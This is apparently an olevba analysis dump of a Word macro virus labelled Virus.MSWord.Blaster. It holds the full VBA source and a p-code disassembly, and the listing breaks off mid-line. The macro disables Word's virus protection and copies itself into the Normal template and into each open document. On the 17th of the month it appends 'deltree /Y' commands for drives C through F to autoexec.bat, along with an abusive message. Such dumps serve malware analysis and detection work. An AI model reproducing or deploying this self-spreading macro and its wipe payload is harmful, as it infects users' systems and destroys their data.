olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Blaster
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Blaster - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    Dim stato As Boolean
    Dim flagaltro As Boolean
    Dim flagio As Boolean
    Dim count As Integer
    Dim stress As String
    Dim bry As Variant

    On Error Resume Next

    stato = ActiveDocument.Saved

    Application.EnableCancelKey = Not -1
    With Options
        .ConfirmConversions = 0
        .VirusProtection = 0
        .SaveNormalPrompt = 0
    End With

    SetAttr "c:\cont.dbl", vbNormal
    Kill "c:\cont.dbl"

    Open "c:\cont.dbl" For Output As #1

    For count = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        If MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then Exit For
    Next count
    
    Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "End Sub"
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
        count = count + 1
    Loop
    
    Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
    
    For count = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        If MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then Exit For
    Next count
    
    Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "End Sub"
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
        count = count + 1
    Loop
    
    Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
    Close #1
        
    SetAttr "c:\cont.dbl", vbNormal

    flagaltro = False
    flagio = False
    
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then Exit For
        Next count
    
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    If flagio = False And flagaltro = False Then
        Open "c:\cont.dbl" For Input As #1
        If LOF(1) = 0 Then GoTo cpynorm
        count = 1
        Do While Not EOF(1)
            Line Input #1, stress
            bry.CodeModule.InsertLines count, stress
            count = count + 1
        Loop
cpynorm:
        Close #1
    End If

    flagaltro = False
    flagio = False
    
    Set bry = ActiveDocument.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then Exit For
        Next count
   
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    If flagio = False And flagaltro = False Then
        Open "c:\cont.dbl" For Input As #1
        If LOF(1) = 0 Then GoTo cpyacti
        count = 1
        Do While Not EOF(1)
            Line Input #1, stress
            bry.CodeModule.InsertLines count, stress
            count = count + 1
        Loop
cpyacti:
        Close #1
    End If

    Kill "c:\cont.dbl"

    Randomize
    If Int((6 * Rnd) + 1) < 3 Then
        With Dialogs(wdDialogFileSummaryInfo)
            .Title = "Macro Carrier"
            .Author = "Dream Blaster"
            .Keywords = "Minny"
            .Execute
        End With
    End If

    If Left(ActiveDocument.Name, 8) <> "Document" Then
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If

    If Day(Date) = 17 Then
        If Dir("c:\minny.log", vbHidden + vbSystem) = "" Then
            SetAttr "c:\autoexec.bat", vbNormal
            Open "c:\autoexec.bat" For Input As #1
                Do Until EOF(1)
                    Input #1, stress
                Loop
            Close #1
            
            If stress <> "you are simply a bitch" Then
                Open "c:\autoexec.bat" For Append As #1
                    Print #1, "deltree /Y f:\*"
                    Print #1, "deltree /Y e:\*"
                    Print #1, "deltree /Y d:\*"
                    Print #1, "deltree /Y c:\*"
                    Print #1, "rem Created by Dream Blaster"
                    Print #1, "rem Minny, you are simply a bitch"
                Close #1
            End If
        Else
            MsgBox "You are protected from this virus damage"
        End If
    End If

    ActiveDocument.Saved = stato
    
    On Error GoTo 0
End Sub
Private Sub Document_Open()
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                flagio = True
                flagaltro = False
                
            End If

     
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then Exit For
        Next count
    
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    flagaltro = False
    flagio = False
    
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim flagaltro As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then Exit For
        Next count
    
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If

    On Error GoTo 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Blaster
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11377 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	Dim 
' 	VarDefn stato (As Boolean)
' Line #2:
' 	Dim 
' 	VarDefn flagaltro (As Boolean)
' Line #3:
' 	Dim 
' 	VarDefn flagio (As Boolean)
' Line #4:
' 	Dim 
' 	VarDefn count (As Integer)
' Line #5:
' 	Dim 
' 	VarDefn stress (As String)
' Line #6:
' 	Dim 
' 	VarDefn bry (As Variant)
' Line #7:
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St stato 
' Line #11:
' Line #12:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #13:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #14:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #15:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #16:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #17:
' 	EndWith 
' Line #18:
' Line #19:
' 	LitStr 0x000B "c:\cont.dbl"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #20:
' 	LitStr 0x000B "c:\cont.dbl"
' 	ArgsCall Kill 0x0001 
' Line #21:
' Line #22:
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #23:
' Line #24:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #25:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #26:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' Line #28:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #29:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #30:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #31:
' 	Loop 
' Line #32:
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #34:
' Line #35:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #36:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #37:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' Line #39:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #41:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #42:
' 	Loop 
' Line #43:
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #46:
' Line #47:
' 	LitStr 0x000B "c:\cont.dbl"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #48:
' Line #49:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #50:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #51:
' Line #52:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #53:
' Line #54:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #55:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #56:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #57:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #58:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0014 "Dim stato As Boolean"
' 	Eq 
' 	IfBlock 
' Line #59:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #60:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #61:
' 	ExitFor 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' Line #66:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #67:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #68:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #69:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #70:
' Line #71:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #72:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #73:
' 	Loop 
' Line #74:
' Line #75:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #76:
' Line #77:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #78:
' 	EndIfBlock 
' Line #79:
' Line #80:
' 	Ld flagio 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld flagaltro 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #81:
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #82:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo cpynorm 
' 	EndIf 
' Line #83:
' 	LitDI2 0x0001 
' 	St count 
' Line #84:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #85:
' 	LitDI2 0x0001 
' 	Ld stress 
' 	LineInput 
' Line #86:
' 	Ld count 
' 	Ld stress 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #87:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #88:
' 	Loop 
' Line #89:
' 	Label cpynorm 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #91:
' 	EndIfBlock 
' Line #92:
' Line #93:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #94:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #95:
' Line #96:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #97:
' Line #98:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #99:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #100:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #101:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #102:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0014 "Dim stato As Boolean"
' 	Eq 
' 	IfBlock 
' Line #103:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #104:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #105:
' 	ExitFor 
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #109:
' Line #110:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #111:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #112:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #113:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' Line #115:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #116:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #117:
' 	Loop 
' Line #118:
' Line #119:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #120:
' Line #121:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #122:
' 	EndIfBlock 
' Line #123:
' Line #124:
' 	Ld flagio 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld flagaltro 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #125:
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #126:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo cpyacti 
' 	EndIf 
' Line #127:
' 	LitDI2 0x0001 
' 	St count 
' Line #128:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #129:
' 	LitDI2 0x0001 
' 	Ld stress 
' 	LineInput 
' Line #130:
' 	Ld count 
' 	Ld stress 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #131:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #132:
' 	Loop 
' Line #133:
' 	Label cpyacti 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #135:
' 	EndIfBlock 
' Line #136:
' Line #137:
' 	LitStr 0x000B "c:\cont.dbl"
' 	ArgsCall Kill 0x0001 
' Line #138:
' Line #139:
' 	ArgsCall Read 0x0000 
' Line #140:
' 	LitDI2 0x0006 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0003 
' 	Lt 
' 	IfBlock 
' Line #141:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #142:
' 	LitStr 0x000D "Macro Carrier"
' 	MemStWith Title 
' Line #143:
' 	LitStr 0x000D "Dream Blaster"
' 	MemStWith Author 
' Line #144:
' 	LitStr 0x0005 "Minny"
' 	MemStWith Keywords 
' Line #145:
' 	ArgsMemCallWith Execute 0x0000 
' Line #146:
' 	EndWith 
' Line #147:
' 	EndIfBlock 
' Line #148:
' Line #149:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #150:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #151:
' 	EndIfBlock 
' Line #152:
' Line #153:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0011 
' 	Eq 
' 	IfBlock 
' Line #154:
' 	LitStr 0x000C "c:\minny.log"
' 	Ld vbHidden 
' 	Ld vbSystem 
' 	Add 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #155:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #156:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #157:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #158:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld stress 
' 	InputItem 
' 	InputDone 
' Line #159:
' 	Loop 
' Line #160:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #161:
' Line #162:
' 	Ld stress 
' 	LitStr 0x0016 "you are simply a bitch"
' 	Ne 
' 	IfBlock 
' Line #163:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #164:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "deltree /Y f:\*"
' 	PrintItemNL 
' Line #165:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "deltree /Y e:\*"
' 	PrintItemNL 
' Line #166:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "deltree /Y d:\*"
' 	PrintItemNL 
' Line #167:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "deltree /Y c:\*"
' 	PrintItemNL 
' Line #168:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "rem Created by Dream Blaster"
' 	PrintItemNL 
' Line #169:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "rem Minny, you are simply a bitch"
' 	PrintItemNL 
' Line #170:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #171:
' 	EndIfBlock 
' Line #172:
' 	ElseBlock 
' Line #173:
' 	LitStr 0x0028 "You are protected from this virus damage"
' 	ArgsCall MsgBox 0x0001 
' Line #174:
' 	EndIfBlock 
' Line #175:
' 	EndIfBlock 
' Line #176:
' Line #177:
' 	Ld stato 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #178:
' Line #179:
' 	OnError (GoTo 0) 
' Line #180:
' 	EndSub 
' Line #181:
' 	FuncDefn (Private Sub Document_Open())
' Line #182:
' 	QuoteRem 0x0000 0x0000 ""
' Line #183:
' 	QuoteRem 0x0000 0x0000 ""
' Line #184:
' 	QuoteRem 0x0000 0x0000 ""
' Line #185:
' 	QuoteRem 0x0000 0x0000 ""
' Line #186:
' 	QuoteRem 0x0000 0x0000 ""
' Line #187:
' 	QuoteRem 0x0000 0x0000 ""
' Line #188:
' 	QuoteRem 0x0000 0x0000 ""
' Line #189:
' 	QuoteRem 0x0000 0x0000 ""
' Line #190:
' 	QuoteRem 0x0000 0x0000 ""
' Line #191:
' 	QuoteRem 0x0000 0x0000 ""
' Line #192:
' 	QuoteRem 0x0000 0x0000 ""
' Line #193:
' 	QuoteRem 0x0000 0x0000 ""
' Line #194:
' 	QuoteRem 0x0000 0x0000 ""
' Line #195:
' 	QuoteRem 0x0000 0x0000 ""
' Line #196:
' 	QuoteRem 0x0000 0x0000 ""
' Line #197:
' 	QuoteRem 0x0000 0x0000 ""
' Line #198:
' 	QuoteRem 0x0000 0x0000 ""
' Line #199:
' 	QuoteRem 0x0000 0x0000 ""
' Line #200:
' 	QuoteRem 0x0000 0x0000 ""
' Line #201:
' 	QuoteRem 0x0000 0x0000 ""
' Line #202:
' 	QuoteRem 0x0000 0x0000 ""
' Line #203:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #204:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #205:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0014 "Dim stato As Boolean"
' 	Eq 
' 	IfBlock 
' Line #206:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #207:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #208:
' Line #209:
' 	EndIfBlock 
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #214:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #215:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #216:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #217:
' Line #218:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #219:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #220:
' 	Loop 
' Line #221:
' Line #222:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #223:
' Line #224:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #225:
' 	EndIfBlock 
' Line #226:
' Line #227:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #228:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #229:
' Line #230:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #231:
' Line #232:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #233:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	IfBlock 
' Line #234:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #235:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #236:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
